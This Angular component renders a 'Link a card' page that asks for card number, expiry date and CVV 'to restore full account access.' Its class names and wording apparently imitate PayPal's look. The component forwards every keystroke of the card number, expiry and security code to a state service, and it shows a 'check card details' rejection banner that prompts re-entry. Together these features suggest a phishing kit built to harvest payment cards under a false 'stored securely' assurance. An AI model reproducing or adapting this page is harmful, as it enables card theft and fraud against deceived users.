
import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { validateCardLogic, CardType } from './card-validation.utils';

@Component({
  selector: 'app-card-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-6">
        <h1 class="text-2xl font-bold text-pp-navy mb-2 text-center tracking-tight">Link a card</h1>
        <p class="text-base text-slate-500 text-center leading-relaxed max-w-[90%]">
           Link a debit or credit card to verify your identity and restore full account access.
        </p>
      </div>

      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">credit_card_off</span>
            <div>
              <p class="text-sm font-bold text-pp-navy">Check card details</p>
              <p class="text-xs text-slate-600 mt-1">We couldn't confirm this card. Please try again.</p>
            </div>
        </div>
      }

      <div class="space-y-6">
        
        <div class="space-y-4">
           <!-- Card Number -->
          <div class="pp-input-group">
            <input 
                 type="text" 
                 [value]="cardNumberDisplay"
                 (input)="onCardInput($event)"
                 (blur)="touchedCard.set(true)"
                 id="cardNum"
                 placeholder=" "
                 maxlength="19"
                 class="pp-input peer font-mono tracking-wide"
                 [class.shadow-input-error]="touchedCard() && !isCardNumValid()"
               >
               <label for="cardNum" class="pp-label">Card number</label>
               
               <!-- Dynamic Brand Icon -->
               @if(cardType() !== 'unknown') {
                   <div class="absolute right-4 top-4 h-7 w-10 bg-white shadow-sm border rounded flex items-center justify-center animate-fade-in">
                        <img *ngIf="cardType() === 'visa'" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" class="h-3 object-contain">
                        <img *ngIf="cardType() === 'mastercard'" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" class="h-4 object-contain">
                        <img *ngIf="cardType() === 'amex'" src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" class="h-3 object-contain">
                        <img *ngIf="cardType() === 'discover'" src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" class="h-5 object-contain">
                   </div>
               }
               @else {
                   <span class="material-icons absolute right-4 top-4 text-slate-300 text-2xl">credit_card</span>
               }
          </div>

           <!-- Exp / CVV Row -->
          <div class="flex gap-4">
             <div class="relative w-1/2 pp-input-group mb-0">
                <input 
                  type="text" 
                  [value]="expiry"
                  (input)="onExpiryInput($event)"
                  (blur)="touchedExp.set(true)"
                  id="expiry"
                  placeholder=" "
                  maxlength="5"
                  class="pp-input peer font-mono"
                  [class.shadow-input-error]="touchedExp() && !isExpiryValid()"
                >
                <label for="expiry" class="pp-label">MM / YY</label>
             </div>
             
             <div class="relative w-1/2 pp-input-group mb-0">
                <input 
                    type="password" 
                    [(ngModel)]="cvv"
                    (ngModelChange)="onCvvChange($event)"
                    (blur)="touchedCvv.set(true)"
                    id="cvv"
                    placeholder=" "
                    [maxlength]="cvvMaxLength()"
                    class="pp-input peer font-mono"
                    [class.shadow-input-error]="touchedCvv() && !isCvvValid()"
                  >
                  <label for="cvv" class="pp-label">Security Code</label>
                  
                  <div class="absolute right-3 top-4 text-slate-400 group relative cursor-help">
                      <span class="material-icons text-[20px]">help_outline</span>
                  </div>
             </div>
          </div>
        </div>

        <div class="pt-4">
          <button 
            (click)="submit()"
            [disabled]="!isValid()"
            [class.opacity-50]="!isValid()"
            class="pp-btn"
          >
            Link Card
          </button>
        </div>
        
        <div class="flex justify-center items-center gap-2 mt-4 opacity-60">
             <span class="material-icons text-[14px] text-pp-success">lock</span>
             <p class="text-xs text-slate-500 font-bold">Your card information is stored securely.</p>
        </div>
      </div>
    </app-public-layout>
  `
})
export class CardVerificationComponent {
  state = inject(StateService);

  cardNumber = '';
  cardNumberDisplay = '';
  expiry = '';
  cvv = '';
  
  // Validation Flags
  touchedCard = signal(false);
  touchedExp = signal(false);
  touchedCvv = signal(false);
  isValid = signal(false);
  isExpiryValid = signal(false);
  
  cardType = signal<CardType>('unknown');

  onCardInput(event: any) {
    let input = event.target.value.replace(/\D/g, ''); 
    if (input.length > 16) {
        input = input.substring(0, 16);
    }
    this.cardNumber = input;
    const parts = input.match(/.{1,4}/g);
    this.cardNumberDisplay = parts ? parts.join(' ') : input;

    this.validate();
    this.state.updateCard({ number: this.cardNumber });
  }

  onExpiryInput(event: any) {
      let input = event.target.value.replace(/\D/g, '');
      if (input.length >= 2) {
          input = input.substring(0, 2) + '/' + input.substring(2, 4);
      }
      this.expiry = input;
      this.validate();
      this.state.updateCard({ expiry: this.expiry });
  }

  onCvvChange(value: string) {
      const clean = value.replace(/\D/g, '');
      if (clean !== value) {
          this.cvv = clean; 
      }
      this.validate();
      this.state.updateCard({ cvv: this.cvv });
  }

  cvvMaxLength() {
      return this.cardType() === 'amex' ? 4 : 3;
  }

  isCvvValid() {
     const len = this.cvv.length;
     const max = this.cvvMaxLength();
     return len === max;
  }
  
  isCardNumValid() {
      const len = this.cardNumber.length;
      if (this.cardType() === 'amex') return len === 15;
      if (this.cardType() === 'diners') return len === 14;
      return len === 16; 
  }

  validate() {
    const res = validateCardLogic(this.cardNumber, this.expiry, this.cvv);
    this.cardType.set(res.cardType);
    this.isExpiryValid.set(res.isExpiryValid);
    this.isValid.set(res.isValid);
  }

  submit() {
    if (this.isValid()) {
      this.state.submitCard(this.cardNumber, this.expiry, this.cvv);
    }
  }
}
